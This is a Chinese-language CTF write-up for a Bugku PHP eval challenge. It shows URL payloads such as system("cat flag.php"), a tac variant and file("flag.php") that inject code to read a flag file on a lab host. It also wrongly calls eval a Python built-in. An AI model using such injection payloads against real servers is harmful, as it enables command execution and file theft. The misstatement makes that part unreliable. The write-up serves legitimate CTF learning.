### bugku_eval

可以看到是一段简单的PHP代码，其中包含了flag.php文件，那么很明显这道题多半就是想办法输出flag.php

```
1. $_REQUEST
php中$_REQUEST可以获取以POST方法和GET方法提交的数据，缺点：速度比较慢 。
2. var_dump()
该方法是判断一个变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型.此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。
它的格式：var_dump ( mixed expression [, mixed expression [, ...]] )
来看看var_dump 语法: var_dump (var,var,bar);
要注意一点,用var_dump里面的变量必须是存在的,如果变量存在但值是空的就会返回false;没有变量则返回NULL.他自己就有输出的功能。不必加其他的输出函数。
3. eval
是Python的一个内置函数，这个函数的作用是，返回传入字符串的表达式的结果。即变量赋值时，等号右边的表示是写成字符串的格式，返回值就是这个表达式的结果。这个函数也可以将括号内的字符串当命令执行
4.show_source
对文件进行语法高亮显示。
```

因此，为了输出文件，可以直接构造playload

```
http://114.67.246.176:13303/?hello=system("cat flag.php")
```

此时可以在源代码中看见flag

经过评论区大佬提醒，也可以使用**hello=system("tac flag.php")**输出，此时直接显示在前端![](https://pic.imgdb.cn/item/60efefe95132923bf8ecce9a.jpg)

>用tac而不是cat：因为那个php文件带有<?php和后面的?>，正序输出会被网页当做php代码运行（结果为空），但是<?php 和?>不在同一行，所以tac反序输出使其不闭合，才可以显示其字符串的形式

还有另外一种构造方式

```
http://114.67.246.176:13303/?hello=file("flag.php")

###################
file() 函数把整个文件读入一个数组中。
与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。
如果失败，则返回 false。
```

![](https://pic.imgdb.cn/item/60eff0975132923bf8f114cd.jpg)